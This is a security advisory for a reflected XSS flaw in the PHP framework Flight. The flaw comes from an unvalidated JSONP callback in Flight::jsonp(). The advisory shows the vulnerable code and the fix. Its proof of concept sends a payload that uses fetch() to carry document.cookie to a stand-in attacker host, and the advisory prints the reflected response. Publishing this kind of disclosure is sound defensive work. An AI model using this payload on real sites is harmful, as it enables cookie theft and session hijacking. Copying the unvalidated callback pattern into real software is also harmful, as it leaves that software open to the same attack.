# [H] Flight has reflected XSS through an unvalidated JSONP callback in Flight::jsonp() 

## Summary
Severity: High
Advisory: GHSA-fcx8-ph5r-mxr4
CVE: CVE-2026-42548
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-fcx8-ph5r-mxr4
Type: github-advisory

## Affected
- Packagist: `flightphp/core` — affected >=0 <3.18.1

## Details
### Summary
`Flight::jsonp()` concatenates the `?jsonp=` query parameter directly into an `application/javascript` response body without validating that the value is a legal JavaScript identifier. An attacker can inject arbitrary JavaScript that executes in the response origin, enabling reflected cross-site scripting.

### Affected code
`flight/Engine.php` (≈ lines 1000-1013):

```php
$callback = $this->request()->query[$param];
$this->response()
    ->status($code)
    ->header('Content-Type', 'application/javascript; charset=' . $charset)
    ->write($callback . '(' . $json . ');');
```

No regex or identifier validation is performed before the callback is written.

### Proof of concept
Given any route that calls `Flight::jsonp($data)`:

```
GET /api?jsonp=;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//
```

Reproduced response (`Content-Type: application/javascript`):

```
;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//({"ok":true,"msg":"hello"});
```

When the vulnerable endpoint is loaded via `<script src="https://victim.tld/api?jsonp=…">` on a page controlled by the attacker, the injected JavaScript executes in the `victim.tld` origin whenever that page is embedded or visited in a same-origin context — cookie theft and session hijack follow.

### Impact
- Reflected XSS in any application calling `Flight::jsonp()`.
- Cookie theft / session hijack when JSONP endpoints are referenced from same-origin pages.
- Exfiltration of authenticated API responses.

### Patch (fixed in `3.18.1`, commit `b8dd23a`)
`_jsonp()` now validates the callback name against `^[A-Za-z_$][\w$.]{0,127}$` before emitting it. An empty callback (no `jsonp` parameter) still behaves as before.

### Credit
Discovered by **@Rootingg**.

## References
- https://github.com/flightphp/core/security/advisories/GHSA-fcx8-ph5r-mxr4
- https://nvd.nist.gov/vuln/detail/CVE-2026-42548
- https://github.com/flightphp/core
